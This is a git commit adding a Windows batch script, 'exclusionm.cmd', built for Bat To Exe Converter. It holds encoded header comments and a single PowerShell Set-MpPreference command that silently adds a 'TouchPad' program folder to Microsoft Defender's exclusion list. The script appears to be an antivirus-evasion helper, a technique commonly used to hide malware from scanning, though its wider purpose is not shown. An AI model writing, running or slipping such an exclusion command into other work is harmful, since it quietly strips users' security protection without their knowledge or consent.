2433f5ec7788a55c5a441253e1e991438d0b6dd6
Jordi Serrano <44474715+j0rd1s3rr4n0@users.noreply.github.com>
2021-08-31 19:01:29 +0200

    V1

---
+++ exclusionm.cmd
@@ -0,0 +1,35 @@
+::[Bat To Exe Converter]
+::
+::YAwzoRdxOk+EWAjk
+::fBw5plQjdCuDJGyX8VAjFCtdTxCXLm6pOrwf5+bHu7rX9xRLAaw2e4C7
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdF+5
+::cxAkpRVqdFKZSTk=
+::cBs/ulQjdF+5
+::ZR41oxFsdFKZSTk=
+::eBoioBt6dFKZSTk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpCI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAjk
+::YxY4rhs+aU+IeA==
+::cxY6rQJ7JhzQF1fEqQJhZksaHErSXA==
+::ZQ05rAF9IBncCkqN+0xwdVsFAlTMbCXqZg==
+::ZQ05rAF9IAHYFVzEqQIVMBhYWReLKm6fHrYQ/fvy4OTn
+::eg0/rx1wNQPfEVWB+kM9LVsJDCW0GQs=
+::fBEirQZwNQPfEVWB+kM9LVsJDCW0GQs=
+::cRolqwZ3JBvQF1fEqQIRJg9deg2QKXj6I60f5P3o5uWJwg==
+::dhA7uBVwLU+EWHPUxmZhG0hmflCsbAs=
+::YQ03rBFzNR3SWATE1k4lLRxGTQCHOAs=
+::dhAmsQZ3MwfNWATEphJiens=
+::ZQ0/vhVqMQ3MEVWAtB9wSA==
+::Zg8zqx1/OA3MEVWAtB9wSA==
+::dhA7pRFwIByZRRmh7EE8PRJGDCKDMHi1FfUq4fru/Io=
+::Zh4grVQjdCyDJGyX8VAjFDpQQQ2MAE+/Fb4I5/jH2+WSoUUtVeYDQKzXz6eLMq4W8kCE
+::YB416Ek+ZW8=
+::
+::
+::978f952a14a936cc963da21a135fa983
+powershell Set-MpPreference -ExclusionPath  'C:\Program Files (x86)\TouchPad\'
+timeout /t 1
